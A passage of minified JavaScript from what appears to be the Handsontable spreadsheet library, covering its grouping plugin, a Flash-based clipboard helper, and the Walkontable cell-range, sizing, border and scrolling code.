Grouping(e);if(!e.getSettings().rowHeaders){n.rowHeaders=true}if(!e.getSettings().colHeaders){n.colHeaders=true}if(n.colHeaders||n.rowHeaders){e.updateSettings(n)}var r=Handsontable.Grouping.validateGroups();if(!r){return}e.addHook("beforeInit",Handsontable.Grouping.hookProxy("init"));e.addHook("afterUpdateSettings",Handsontable.Grouping.hookProxy("updateGroups"));e.addHook("afterGetColumnHeaderRenderers",Handsontable.Grouping.hookProxy("afterGetColumnHeaderRenderers"));e.addHook("afterGetRowHeaderRenderers",Handsontable.Grouping.hookProxy("afterGetRowHeaderRenderers"));e.addHook("afterGetRowHeader",Handsontable.Grouping.hookProxy("afterGetRowHeader"));e.addHook("afterGetColHeader",Handsontable.Grouping.hookProxy("afterGetColHeader"));e.addHook("beforeOnCellMouseDown",Handsontable.Grouping.hookProxy("toggleGroupVisibility"));e.addHook("modifyTransformStart",Handsontable.Grouping.hookProxy("modifySelectionFactory","start"));e.addHook("modifyTransformEnd",Handsontable.Grouping.hookProxy("modifySelectionFactory","end"));e.addHook("modifyRowHeight",Handsontable.Grouping.hookProxy("modifyRowHeight"))}};var updateHeaderWidths=function(){var e=document.querySelectorAll("colgroup");for(var t=0,n=e.length;t<n;t++){var r=e[t].querySelectorAll("col.rowHeader");if(r.length==0){return}for(var i=0,s=r.length+1;i<s;i++){if(s==2){return}if(i<Handsontable.Grouping.getLevels().rows+1){if(i==Handsontable.Grouping.getLevels().rows){Handsontable.Dom.addClass(r[i],"htGroupColClosest")}else{Handsontable.Dom.addClass(r[i],"htGroupCol")}}}}};Handsontable.hooks.add("beforeInit",init);Handsontable.hooks.add("afterUpdateSettings",function(){if(this.getSettings().groups&&!Handsontable.Grouping){init.call(this,arguments)}else if(!this.getSettings().groups&&Handsontable.Grouping){Handsontable.Grouping.resetGroups();Handsontable.Grouping=void 0}});Handsontable.plugins.Grouping=Grouping;(function(e){function t(){this.zeroClipboardInstance=null;this.instance=null}t.prototype.prepareZeroClipboard=function(){if(this.swfPath){ZeroClipboard.config({swfPath:this.swfPath})}};t.prototype.copy=function(){this.instance.copyPaste.setCopyableText();return this.instance.copyPaste.copyPasteInstance.elTextarea.value};t.prototype.addToContextMenu=function(t){if(!this.getSettings().contextMenuCopyPaste){return}t.items.unshift({key:"copy",name:"Copy"},{key:"paste",name:"Paste",callback:function(){this.copyPaste.triggerPaste()}},e.ContextMenu.SEPARATOR)};t.prototype.setupZeroClipboard=function(t){var r=this;this.cmInstance=t;if(!e.Dom.hasClass(this.cmInstance.rootElement[0],"htContextMenu")){return}var i=t.getData();for(var s=0,o=i.length;s<o;s++){if(i[s].key==="copy"){this.zeroClipboardInstance=new ZeroClipboard(t.getCell(s,0));this.zeroClipboardInstance.off();this.zeroClipboardInstance.on("copy",function(e){var t=e.clipboardData;t.setData("text/plain",r.copy());r.instance.getSettings().outsideClickDeselects=r.outsideClickDeselectsCache});n.bindEvents();break}}};t.prototype.bindEvents=function(){var t=this;if(t.cmInstance){$(document).off("mouseenter."+t.cmInstance.guid).on("mouseenter."+t.cmInstance.guid,"#global-zeroclipboard-flash-bridge",function(n){var r=t.cmInstance.rootElement[0].querySelector("td.current");if(r){e.Dom.removeClass(r,"current")}t.outsideClickDeselectsCache=t.instance.getSettings().outsideClickDeselects;t.instance.getSettings().outsideClickDeselects=false});$(document).off("mouseleave."+t.cmInstance.guid).on("mouseleave."+t.cmInstance.guid,"#global-zeroclipboard-flash-bridge",function(n){var r=t.cmInstance.rootElement[0].querySelector("td.zeroclipboard-is-hover");if(r){e.Dom.removeClass(r,"zeroclipboard-is-hover")}t.instance.getSettings().outsideClickDeselects=t.outsideClickDeselectsCache})}};t.prototype.init=function(){if(!this.getSettings().contextMenuCopyPaste){return}else if(typeof this.getSettings().contextMenuCopyPaste=="object"){n.swfPath=this.getSettings().contextMenuCopyPaste.swfPath}if(typeof ZeroClipboard==="undefined"){throw new Error("To be able to use the Copy/Paste feature from the context menu, you need to manualy include ZeroClipboard.js file to your website.");return false}try{var e=new ActiveXObject("ShockwaveFlash.ShockwaveFlash")}catch(t){if(!("undefined"!=typeof navigator.mimeTypes["application/x-shockwave-flash"])){throw new Error("To be able to use the Copy/Paste feature from the context menu, your browser needs to have Flash Plugin installed.");return false}}n.instance=this;n.prepareZeroClipboard()};var n=new t;e.hooks.add("afterRender",function(){n.setupZeroClipboard(this)});e.hooks.add("afterInit",n.init);e.hooks.add("afterContextMenuDefaultOptions",n.addToContextMenu);e.ContextMenuCopyPaste=t})(Handsontable);WalkontableOverlay.prototype.init=function(){this.TABLE=this.instance.wtTable.TABLE;this.fixed=this.instance.wtTable.hider;this.fixedContainer=this.instance.wtTable.holder;this.scrollHandler=this.getScrollableElement(this.TABLE);this.$scrollHandler=$(this.scrollHandler)};WalkontableOverlay.prototype.makeClone=function(e){var t=document.createElement("DIV");t.className="ht_clone_"+e+" handsontable";t.style.position="absolute";t.style.overflow="hidden";var n=document.createElement("TABLE");n.className=this.instance.wtTable.TABLE.className;t.appendChild(n);this.instance.wtTable.holder.parentNode.appendChild(t);return new Walkontable({cloneSource:this.instance,cloneOverlay:this,table:n})};WalkontableOverlay.prototype.getScrollableElement=function(e){var t=e.parentNode;while(t&&t.style){if(t.style.overflow!=="visible"&&t.style.overflow!==""){return t}if(this instanceof WalkontableHorizontalScrollbarNative&&t.style.overflowX!=="visible"&&t.style.overflowX!==""){return t}t=t.parentNode}return window};WalkontableOverlay.prototype.refresh=function(e){this.clone&&this.clone.draw(e)};WalkontableOverlay.prototype.destroy=function(){this.$scrollHandler.off("."+this.clone.guid);$(window).off("."+this.clone.guid);$(document).off("."+this.clone.guid);$(document.body).off("."+this.clone.guid)};WalkontableAbstractStrategy.prototype.getSize=function(e){return this.cellSizes[e]};WalkontableAbstractStrategy.prototype.getContainerSize=function(e){return typeof this.containerSizeFn==="function"?this.containerSizeFn(e):this.containerSizeFn};WalkontableAbstractStrategy.prototype.countVisible=function(){return this.cellCount};WalkontableAbstractStrategy.prototype.isLastIncomplete=function(){return this.remainingSize>0};WalkontableBorder.prototype.appear=function(e){var t,n,r,i,s,o,u,a,f,l,c,h;if(this.disabled){return}var p=this.instance;var d,v,m,g,y,b,w;if(p.cloneOverlay instanceof WalkontableVerticalScrollbarNative||p.cloneOverlay instanceof WalkontableCornerScrollbarNative){b=p.getSetting("fixedRowsTop")}else{b=p.wtTable.getRowStrategy().countVisible()}for(y=0;y<b;y++){w=p.wtTable.rowFilter.visibleToSource(y);if(w>=e[0]&&w<=e[2]){d=w;break}}for(y=b-1;y>=0;y--){w=p.wtTable.rowFilter.visibleToSource(y);if(w>=e[0]&&w<=e[2]){m=w;break}}if(p.cloneOverlay instanceof WalkontableHorizontalScrollbarNative||p.cloneOverlay instanceof WalkontableCornerScrollbarNative){b=p.getSetting("fixedColumnsLeft")}else{b=p.wtTable.getColumnStrategy().cellCount}for(y=0;y<b;y++){w=p.wtTable.columnFilter.visibleToSource(y);if(w>=e[1]&&w<=e[3]){v=w;break}}for(y=b-1;y>=0;y--){w=p.wtTable.columnFilter.visibleToSource(y);if(w>=e[1]&&w<=e[3]){g=w;break}}if(d!==void 0&&v!==void 0){t=d!==m||v!==g;n=p.wtTable.getCell(new WalkontableCellCoords(d,v));r=t?p.wtTable.getCell(new WalkontableCellCoords(m,g)):n;i=Handsontable.Dom.offset(n);s=t?Handsontable.Dom.offset(r):i;o=Handsontable.Dom.offset(p.wtTable.TABLE);a=i.top;c=s.top+Handsontable.Dom.outerHeight(r)-a;l=i.left;h=s.left+Handsontable.Dom.outerWidth(r)-l;u=a-o.top-1;f=l-o.left-1;var E=Handsontable.Dom.getComputedStyle(n);if(parseInt(E["borderTopWidth"],10)>0){u+=1;c=c>0?c-1:0}if(parseInt(E["borderLeftWidth"],10)>0){f+=1;h=h>0?h-1:0}}else{this.disappear();return}this.topStyle.top=u+"px";this.topStyle.left=f+"px";this.topStyle.width=h+"px";this.topStyle.display="block";this.leftStyle.top=u+"px";this.leftStyle.left=f+"px";this.leftStyle.height=c+"px";this.leftStyle.display="block";var S=Math.floor(this.settings.border.width/2);this.bottomStyle.top=u+c-S+"px";this.bottomStyle.left=f+"px";this.bottomStyle.width=h+"px";this.bottomStyle.display="block";this.rightStyle.top=u+"px";this.rightStyle.left=f+h-S+"px";this.rightStyle.height=c+1+"px";this.rightStyle.display="block";if(!this.hasSetting(this.settings.border.cornerVisible)){this.cornerStyle.display="none"}else{this.cornerStyle.top=u+c-4+"px";this.cornerStyle.left=f+h-4+"px";this.cornerStyle.display="block"}};WalkontableBorder.prototype.disappear=function(){this.topStyle.display="none";this.leftStyle.display="none";this.bottomStyle.display="none";this.rightStyle.display="none";this.cornerStyle.display="none"};WalkontableBorder.prototype.hasSetting=function(e){if(typeof e==="function"){return e()}return!!e};WalkontableCellCoords.prototype.isValid=function(e){if(this.row<0||this.col<0){return false}if(this.row>=e.getSetting("totalRows")||this.col>=e.getSetting("totalColumns")){return false}return true};WalkontableCellCoords.prototype.isEqual=function(e){if(e===this){return true}return this.row===e.row&&this.col===e.col};WalkontableCellCoords.prototype.isSouthEastOf=function(e){return this.row>=e.row&&this.col>=e.col};WalkontableCellCoords.prototype.isNorthWestOf=function(e){return this.row<=e.row&&this.col<=e.col};WalkontableCellCoords.prototype.isSouthWestOf=function(e){return this.row>=e.row&&this.col<=e.col};WalkontableCellCoords.prototype.isNorthEastOf=function(e){return this.row<=e.row&&this.col>=e.col};window.WalkontableCellCoords=WalkontableCellCoords;WalkontableCellRange.prototype.isValid=function(e){return this.from.isValid(e)&&this.to.isValid(e)};WalkontableCellRange.prototype.isSingle=function(){return this.from.row===this.to.row&&this.from.col===this.to.col};WalkontableCellRange.prototype.includes=function(e){var t=this.getTopLeftCorner();var n=this.getBottomRightCorner();if(e.row<0){e.row=0}if(e.col<0){e.col=0}return t.row<=e.row&&n.row>=e.row&&t.col<=e.col&&n.col>=e.col};WalkontableCellRange.prototype.includesRange=function(e){return this.includes(e.getTopLeftCorner())&&this.includes(e.getBottomRightCorner())};WalkontableCellRange.prototype.isEqual=function(e){return Math.min(this.from.row,this.to.row)==Math.min(e.from.row,e.to.row)&&Math.max(this.from.row,this.to.row)==Math.max(e.from.row,e.to.row)&&Math.min(this.from.col,this.to.col)==Math.min(e.from.col,e.to.col)&&Math.max(this.from.col,this.to.col)==Math.max(e.from.col,e.to.col)};WalkontableCellRange.prototype.overlaps=function(e){return e.isSouthEastOf(this.getTopLeftCorner())&&e.isNorthWestOf(this.getBottomRightCorner())};WalkontableCellRange.prototype.isSouthEastOf=function(e){return this.getTopLeftCorner().isSouthEastOf(e)||this.getBottomRightCorner().isSouthEastOf(e)};WalkontableCellRange.prototype.isNorthWestOf=function(e){return this.getTopLeftCorner().isNorthWestOf(e)||this.getBottomRightCorner().isNorthWestOf(e)};WalkontableCellRange.prototype.expand=function(e){var t=this.getTopLeftCorner();var n=this.getBottomRightCorner();if(e.row<t.row||e.col<t.col||e.row>n.row||e.col>n.col){this.from=new WalkontableCellCoords(Math.min(t.row,e.row),Math.min(t.col,e.col));this.to=new WalkontableCellCoords(Math.max(n.row,e.row),Math.max(n.col,e.col));return true}return false};WalkontableCellRange.prototype.expandByRange=function(e){if(this.includesRange(e)||!this.overlaps(e)){return false}var t=this.getTopLeftCorner(),n=this.getBottomRightCorner(),r=this.getTopRightCorner(),i=this.getBottomLeftCorner();var s=e.getTopLeftCorner();var o=e.getBottomRightCorner();var u=Math.min(t.row,s.row);var a=Math.min(t.col,s.col);var f=Math.max(n.row,o.row);var l=Math.max(n.col,o.col);var c=new WalkontableCellCoords(u,a),h=new WalkontableCellCoords(f,l);var p=(new WalkontableCellRange(c,c,h)).isCorner(this.from,e),d=e.isEqual(new WalkontableCellRange(c,c,h));if(p&&!d){if(this.from.col>c.col){c.col=l;h.col=a}if(this.from.row>c.row){c.row=f;h.row=u}}this.from=c;this.to=h;return true};WalkontableCellRange.prototype.getDirection=function(){if(this.from.isNorthWestOf(this.to)){return"NW-SE"}else if(this.from.isNorthEastOf(this.to)){return"NE-SW"}else if(this.from.isSouthEastOf(this.to)){return"SE-NW"}else if(this.from.isSouthWestOf(this.to)){return"SW-NE"}};WalkontableCellRange.prototype.setDirection=function(e){switch(e){case"NW-SE":this.from=this.getTopLeftCorner();this.to=this.getBottomRightCorner();break;case"NE-SW":this.from=this.getTopRightCorner();this.to=this.getBottomLeftCorner();break;case"SE-NW":this.from=this.getBottomRightCorner();this.to=this.getTopLeftCorner();break;case"SW-NE":this.from=this.getBottomLeftCorner();this.to=this.getTopRightCorner();break}};WalkontableCellRange.prototype.getTopLeftCorner=function(){return new WalkontableCellCoords(Math.min(this.from.row,this.to.row),Math.min(this.from.col,this.to.col))};WalkontableCellRange.prototype.getBottomRightCorner=function(){return new WalkontableCellCoords(Math.max(this.from.row,this.to.row),Math.max(this.from.col,this.to.col))};WalkontableCellRange.prototype.getTopRightCorner=function(){return new WalkontableCellCoords(Math.min(this.from.row,this.to.row),Math.max(this.from.col,this.to.col))};WalkontableCellRange.prototype.getBottomLeftCorner=function(){return new WalkontableCellCoords(Math.max(this.from.row,this.to.row),Math.min(this.from.col,this.to.col))};WalkontableCellRange.prototype.isCorner=function(e,t){if(t){if(t.includes(e)){if(this.getTopLeftCorner().isEqual(new WalkontableCellCoords(t.from.row,t.from.col))||this.getTopRightCorner().isEqual(new WalkontableCellCoords(t.from.row,t.to.col))||this.getBottomLeftCorner().isEqual(new WalkontableCellCoords(t.to.row,t.from.col))||this.getBottomRightCorner().isEqual(new WalkontableCellCoords(t.to.row,t.to.col))){return true}}}return e.isEqual(this.getTopLeftCorner())||e.isEqual(this.getTopRightCorner())||e.isEqual(this.getBottomLeftCorner())||e.isEqual(this.getBottomRightCorner())};WalkontableCellRange.prototype.getOppositeCorner=function(e,t){if(!(e instanceof WalkontableCellCoords))return false;if(t){if(t.includes(e)){if(this.getTopLeftCorner().isEqual(new WalkontableCellCoords(t.from.row,t.from.col)))return this.getBottomRightCorner();if(this.getTopRightCorner().isEqual(new WalkontableCellCoords(t.from.row,t.to.col)))return this.getBottomLeftCorner();if(this.getBottomLeftCorner().isEqual(new WalkontableCellCoords(t.to.row,t.from.col)))return this.getTopRightCorner();if(this.getBottomRightCorner().isEqual(new WalkontableCellCoords(t.to.row,t.to.col)))return this.getTopLeftCorner()}}if(e.isEqual(this.getBottomRightCorner())){return this.getTopLeftCorner()}else if(e.isEqual(this.getTopLeftCorner())){return this.getBottomRightCorner()}else if(e.isEqual(this.getTopRightCorner())){return this.getBottomLeftCorner()}else if(e.isEqual(this.getBottomLeftCorner())){return this.getTopRightCorner()}};WalkontableCellRange.prototype.getBordersSharedWith=function(e){if(!this.includesRange(e)){return[]}var t={top:Math.min(this.from.row,this.to.row),bottom:Math.max(this.from.row,this.to.row),left:Math.min(this.from.col,this.to.col),right:Math.max(this.from.col,this.to.col)},n={top:Math.min(e.from.row,e.to.row),bottom:Math.max(e.from.row,e.to.row),left:Math.min(e.from.col,e.to.col),right:Math.max(e.from.col,e.to.col)},r=[];if(t.top==n.top){r.push("top")}if(t.right==n.right){r.push("right")}if(t.bottom==n.bottom){r.push("bottom")}if(t.left==n.left){r.push("left")}return r};WalkontableCellRange.prototype.getInner=function(){var e=this.getTopLeftCorner();var t=this.getBottomRightCorner();var n=[];for(var r=e.row;r<=t.row;r++){for(var i=e.col;i<=t.col;i++){if(!(this.from.row===r&&this.from.col===i)&&!(this.to.row===r&&this.to.col===i)){n.push(new WalkontableCellCoords(r,i))}}}return n};WalkontableCellRange.prototype.getAll=function(){var e=this.getTopLeftCorner();var t=this.getBottomRightCorner();var n=[];for(var r=e.row;r<=t.row;r++){for(var i=e.col;i<=t.col;i++){if(e.row===r&&e.col===i){n.push(e)}else if(t.row===r&&t.col===i){n.push(t)}else{n.push(new WalkontableCellCoords(r,i))}}}return n};WalkontableCellRange.prototype.forAll=function(e){var t=this.getTopLeftCorner();var n=this.getBottomRightCorner();for(var r=t.row;r<=n.row;r++){for(var i=t.col;i<=n.col;i++){var s=e(r,i);if(s===false){return}}}};window.WalkontableCellRange=WalkontableCellRange;WalkontableColumnFilter.prototype.visibleToSource=function(e){return e};WalkontableColumnFilter.prototype.sourceToVisible=function(e){return e};WalkontableColumnFilter.prototype.offsettedTH=function(e){return e-this.countTH};WalkontableColumnFilter.prototype.unOffsettedTH=function(e){return e+this.countTH};WalkontableColumnFilter.prototype.visibleRowHeadedColumnToSourceColumn=function(e){return this.visibleToSource(this.offsettedTH(e))};WalkontableColumnFilter.prototype.sourceColumnToVisibleRowHeadedColumn=function(e){return this.unOffsettedTH(this.sourceToVisible(e))};WalkontableColumnStrategy.prototype=new WalkontableAbstractStrategy;WalkontableColumnStrategy.prototype.getSize=function(e){return this.cellSizes[e]+(this.cellStretch[e]||0)};WalkontableColumnStrategy.prototype.stretch=function(){var e,t=0;e=this.instance.wtTable.allRowsInViewport()?this.getContainerSize():this.getContainerSize(Infinity);this.remainingSize=this.cellSizesSum-e;this.cellStretch.length=0;if(this.strategy==="all"){if(this.remainingSize<0){var n=e/this.cellSizesSum;var r;while(t<this.cellCount-1){r=Math.floor(n*this.cellSizes[t]);this.remainingSize+=r-this.cellSizes[t];this.cellStretch[t]=r-this.cellSizes[t];t++}this.cellStretch[this.cellCount-1]=-this.remainingSize;this.remainingSize=0}}else if(this.strategy==="last"){if(this.remainingSize<0&&e!==Infinity){this.cellStretch[this.cellCount-1]=-this.remainingSize;this.remainingSize=0}}};WalkontableColumnStrategy.prototype.countVisible=function(){return this.visibleCellCount};WalkontableColumnStrategy.prototype.isLastIncomplete=function(){var e=this.instance.wtTable.getFirstVisibleRow();var t=this.instance.wtTable.getLastVisibleColumn();var n=this.instance.wtTable.getCell(new WalkontableCellCoords(e,t));var r=Handsontable.Dom.offset(n);var i=Handsontable.Dom.outerWidth(n);var s=r.left+i;var o=this.instance.wtScrollbars.vertical.getScrollPosition();var u=this.instance.wtViewport.getViewportWidth();var a=o+u;return a>=s};Walkontable.prototype.draw=function(e){this.drawInterrupted=false;if(!e&&!Handsontable.Dom.isVisible(this.wtTable.TABLE)){this.drawInterrupted=true;return}e=e&&this.getSetting("offsetRow")===this.lastOffsetRow;this.lastOffsetRow=this.getSetting("offsetRow");var t=this.getSetting("totalRows");if(this.lastOffsetRow>t&&t>0){this.scrollVertical(-Infinity);this.scrollViewport(new WalkontableCellCoords(t-1,0))}this.wtTable.draw(e);return this};Walkontable.prototype.update=function(e,t){return this.wtSettings.update(e,t)};Walkontable.prototype.scrollVertical=function(e){var t=this.wtScroll.scrollVertical(e);this.getSetting("onScrollVertically");return t};Walkontable.prototype.scrollHorizontal=function(e){var t=this.wtScroll.scrollHorizontal(e);this.getSetting("onScrollHorizontally");return t};Walkontable.prototype.scrollViewport=function(e){this.wtScroll.scrollViewport(e);return this};Walkontable.prototype.getViewport=function(){return[this.wtTable.getFirstVisibleRow(),this.wtTable.getFirstVisibleColumn(),this.wtTable.getLastVisibleRow(),this.wtTable.getLastVisibleColumn()]};Walkontable.prototype.getSetting=function(e,t,n,r,i){return this.wtSettings.getSetting(e,t,n,r,i)};Walkontable.prototype.hasSetting=function(e){return this.wtSettings.has(e)};Walkontable.prototype.destroy=function(){$(window).off("."+this.guid);$(document.body).off("."+this.guid);this.wtScrollbars.destroy();this.wtEvent&&this.wtEvent.destroy()};WalkontableDebugOverlay.prototype=new WalkontableOverlay;WalkontableDebugOverlay.prototype.resetFixedPosition=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;var t=this.instance.wtTable.holder.getBoundingClientRect();e.style.top=Math.ceil(t.top,10)+"px";e.style.left=Math.ceil(t.left,10)+"px"};WalkontableDebugOverlay.prototype.destroy=function(){WalkontableOverlay.prototype.destroy.call(this);clearTimeout(this.lastTimeout)};WalkontableEvent.prototype.parentCell=function(e){var t={};var n=this.instance.wtTable.TABLE;var r=Handsontable.Dom.closest(e,["TD","TH"],n);if(r&&Handsontable.Dom.isChildOf(r,n)){t.coords=this.instance.wtTable.getCoords(r);t.TD=r}else if(Handsontable.Dom.hasClass(e,"wtBorder")&&Handsontable.Dom.hasClass(e,"current")){t.coords=this.instance.selections[0].cellRange.highlight;t.TD=this.instance.wtTable.getCell(t.coords)}else if(Handsontable.Dom.hasClass(e,"wtBorder")&&Handsontable.Dom.hasClass(e,"area")){t.coords=this.instance.selections[1].cellRange.to;t.TD=this.instance.wtTable.getCell(t.coords)}return t};WalkontableEvent.prototype.destroy=function(){clearTimeout(this.dblClickTimeout[0]);clearTimeout(this.dblClickTimeout[1])};window.requestAnimFrame=function(){return window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(e,t){return window.setTimeout(e,1e3/60)}}();window.cancelRequestAnimFrame=function(){return window.cancelAnimationFrame||window.webkitCancelRequestAnimationFrame||window.mozCancelRequestAnimationFrame||window.oCancelRequestAnimationFrame||window.msCancelRequestAnimationFrame||clearTimeout}();if(!window.getComputedStyle){(function(){var e;var t={getPropertyValue:function(n){if(n=="float")n="styleFloat";return e.currentStyle[n.toUpperCase()]||null}};window.getComputedStyle=function(n){e=n;return t}})()}if(!String.prototype.trim){var trimRegex=/^\s+|\s+$/g;String.prototype.trim=function(){return this.replace(trimRegex,"")}}WalkontableRowFilter.prototype.offsetted=function(e){return e+this.offset};WalkontableRowFilter.prototype.unOffsetted=function(e){return e-this.offset};WalkontableRowFilter.prototype.visibleToSource=function(e){return this.offsetted(e)};WalkontableRowFilter.prototype.sourceToVisible=function(e){return this.unOffsetted(e)};WalkontableRowFilter.prototype.offsettedTH=function(e){return e-this.countTH};WalkontableRowFilter.prototype.visibleColHeadedRowToSourceRow=function(e){return this.visibleToSource(this.offsettedTH(e))};WalkontableRowFilter.prototype.sourceRowToVisibleColHeadedRow=function(e){return this.unOffsettedTH(this.sourceToVisible(e))};WalkontableRowStrategy.prototype=new WalkontableAbstractStrategy;WalkontableRowStrategy.prototype.add=function(e,t){if(!this.canRenderMoreRows()){return false}var n=this.sizeAtIndex(e,t);if(n===void 0){return false}var r=this.getContainerSize(this.cellSizesSum+n);this.cellSizes.push(n);this.cellSizesSum+=n;this.cellCount++;this.remainingSize=this.cellSizesSum-r;if(this.remainingSize<=n){this.visiblCellCount++}return true};WalkontableRowStrategy.prototype.canRenderMoreRows=function(){return this.remainingSize<=0||this.cellCount-this.visiblCellCount<this.curOuts};WalkontableRowStrategy.prototype.remove=function(){var e=this.cellSizes.pop();this.cellSizesSum-=e;this.cellCount--;this.remainingSize-=e};WalkontableRowStrategy.prototype.removeOutstanding=function(){while(this.cellCount-this.visiblCellCount>this.curOuts){this.remove()}};WalkontableRowStrategy.prototype.countRendered=function(){return this.cellCount};WalkontableRowStrategy.prototype.countVisible=function(){return this.visiblCellCount};WalkontableRowStrategy.prototype.isLastIncomplete=function(){var e=this.instance.wtTable.getLastVisibleRow();var t=this.instance.wtTable.getFirstVisibleColumn();var n=this.instance.wtTable.getCell(new WalkontableCellCoords(e,t));var r=Handsontable.Dom.offset(n).top;var i=Handsontable.Dom.outerHeight(n);var s=r+i;var o=this.instance.wtScrollbars.horizontal.scrollHandler.offsetTop+this.instance.wtScrollbars.vertical.getScrollPosition();var u=this.instance.wtViewport.getViewportHeight();var a=o+u;return a<s};WalkontableScroll.prototype.scrollVertical=function(e){if(!this.instance.drawn){throw new Error("scrollVertical can only be called after table was drawn to DOM")}var t=this.instance,n,r=t.getSetting("offsetRow"),i=t.getSetting("fixedRowsTop"),s=t.getSetting("totalRows"),o=t.wtViewport.getViewportHeight();if(s>0&&!this.instance.wtTable.isLastRowFullyVisible()){n=this.scrollLogicVertical(e,r,s,i,o,function(e){if(e-r<i&&e-r>=0){return t.getSetting("rowHeight",e-r)}else{return t.getSetting("rowHeight",e)}})}else{n=0}if(n!==r){this.instance.wtScrollbars.vertical.scrollTo(n)}return t};WalkontableScroll.prototype.scrollHorizontal=function(e){this.instance.wtScrollbars.horizontal.scrollTo(e);return this.instance};WalkontableScroll.prototype.scrollLogicVertical=function(e,t,n,r,i,s){var o=t+e;if(o>=n-r){o=n-r-1}if(o<0){o=0}return o};WalkontableScroll.prototype.scrollViewport=function(e){if(!this.instance.drawn){return}var t=this.instance.getSetting("offsetRow"),n=this.instance.getSetting("totalRows"),r=this.instance.getSetting("totalColumns");if(e.row<0||e.row>n-1){throw new Error("row "+e.row+" does not exist")}if(e.col<0||e.col>r-1){throw new Error("column "+e.col+" does not exist")}var i=this.instance.wtTable.getCell(e);if(typeof i==="object"){if(e.col>=this.instance.getSetting("fixedColumnsLeft")){this.scrollToRenderedCell(i)}}else if(e.row>=this.instance.wtTable.getLastVisibleRow()){this.scrollVertical(e.row-this.instance.wtTable.getLastVisibleRow());if(e.row==this.instance.wtTable.getLastVisibleRow()&&this.instance.wtTable.getRowStrategy().isLastIncomplete()){this.scrollViewport(e)}}else if(e.row>=this.instance.getSetting("fixedRowsTop")){this.scrollVertical(e.row-this.instance.wtTable.getFirstVisibleRow())}};WalkontableScroll.prototype.scrollToRenderedCell=function(e){var t=Handsontable.Dom.offset(e);var n=Handsontable.Dom.outerWidth(e);var r=Handsontable.Dom.outerHeight(e);var i=Handsontable.Dom.offset(this.instance.wtTable.TABLE);var s={left:this.instance.wtScrollbars.horizontal.getScrollPosition(),top:this.instance.wtScrollbars.vertical.getScrollPosition()};var o=this.instance.wtViewport.getWorkspaceWidth();var u=this.instance.wtViewport.getWorkspaceHeight();var a=Handsontable.Dom.outerWidth(this.instance.wtScrollbars.horizontal.clone.wtTable.TABLE);var f=Handsontable.Dom.outerHeight(this.instance.wtScrollbars.vertical.clone.wtTable.TABLE);if(this.instance.wtScrollbars.horizontal.scrollHandler!==window){i.left=0;t.left-=Handsontable.Dom.offset(this.instance.wtScrollbars.horizontal.scrollHandler).left}if(this.instance.wtScrollbars.vertical.scrollHandler!==window){i.top=0;t.top=t.top-Handsontable.Dom.offset(this.instance.wtScrollbars.vertical.scrollHandler).top}if(n<o){if(t.left<s.left+a){this.instance.wtScrollbars.horizontal.setScrollPosition(t.left-a)}else if(t.left+n>i.left+s.left+o){var l=t.left+n-(i.left+s.left+o);this.instance.wtScrollbars.horizontal.setScrollPosition(s.left+l)}}if(r<u){if(t.top<s.top+f){this.instance.wtScrollbars.vertical.setScrollPosition(t.top-f);this.instance.wtScrollbars.vertical.onScroll()}else if(t.top+r>s.top+u){this.instance.wtScrollbars.vertical.setScrollPosition(t.top-u+r);this.instance.wtScrollbars.vertical.onScroll()}}};WalkontableCornerScrollbarNative.prototype=new WalkontableOverlay;WalkontableCornerScrollbarNative.prototype.resetFixedPosition=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;if(this.scrollHandler===window){var t=this.instance.wtTable.holder.getBoundingClientRect();var n=Math.ceil(t.top);var r=Math.ceil(t.left);if(r<0){e.style.left=-r+"px"}else{e.style.left="0"}if(n<0){e.style.top=-n+"px"}else{e.style.top="0"}}else{e.style.top=this.instance.wtScrollbars.vertical.getScrollPosition()+"px";e.style.left=this.instance.wtScrollbars.horizontal.getScrollPosition()+"px"}e.style.width=Handsontable.Dom.outerWidth(this.clone.wtTable.TABLE)+4+"px";e.style.height=Handsontable.Dom.outerHeight(this.clone.wtTable.TABLE)+4+"px"};WalkontableHorizontalScrollbarNative.prototype=new WalkontableOverlay;WalkontableHorizontalScrollbarNative.prototype.resetFixedPosition=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;if(this.scrollHandler===window){var t=this.instance.wtTable.holder.getBoundingClientRect();var n=Math.ceil(t.left);if(n<0){e.style.left=-n+"px"}else{e.style.left="0"}e.style.top=this.instance.wtTable.hider.style.top}else{e.style.top=this.instance.wtTable.hider.style.top;e.style.left=this.getScrollPosition()+"px"}e.style.height=Handsontable.Dom.outerHeight(this.clone.wtTable.TABLE)+"px";e.style.width=Handsontable.Dom.outerWidth(this.clone.wtTable.TABLE)+4+"px"};WalkontableHorizontalScrollbarNative.prototype.refresh=function(e){WalkontableOverlay.prototype.refresh.call(this,e)};WalkontableHorizontalScrollbarNative.prototype.getScrollPosition=function(){return Handsontable.Dom.getScrollLeft(this.scrollHandler)};WalkontableHorizontalScrollbarNative.prototype.setScrollPosition=function(e){if(this.scrollHandler===window){window.scrollTo(e,Handsontable.Dom.getWindowScrollTop())}else{this.scrollHandler.scrollLeft=e}};WalkontableHorizontalScrollbarNative.prototype.onScroll=function(){this.readSettings();this.instance.getSetting("onScrollHorizontally")};WalkontableHorizontalScrollbarNative.prototype.getLastCell=function(){return this.instance.wtTable.getLastVisibleColumn()};WalkontableHorizontalScrollbarNative.prototype.applyToDOM=function(){};WalkontableHorizontalScrollbarNative.prototype.scrollTo=function(e){this.setScrollPosition(this.getTableParentOffset()+e*this.cellSize)};WalkontableHorizontalScrollbarNative.prototype.getTableParentOffset=function(){if(this.scrollHandler===window){return this.instance.wtTable.holderOffset.left}else{return 0}};WalkontableHorizontalScrollbarNative.prototype.readSettings=function(){this.total=this.instance.getSetting("totalColumns")};WalkontableVerticalScrollbarNative.prototype=new WalkontableOverlay;WalkontableVerticalScrollbarNative.prototype.resetFixedPosition=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;if(this.scrollHandler===window){var t=this.instance.wtTable.holder.getBoundingClientRect();var 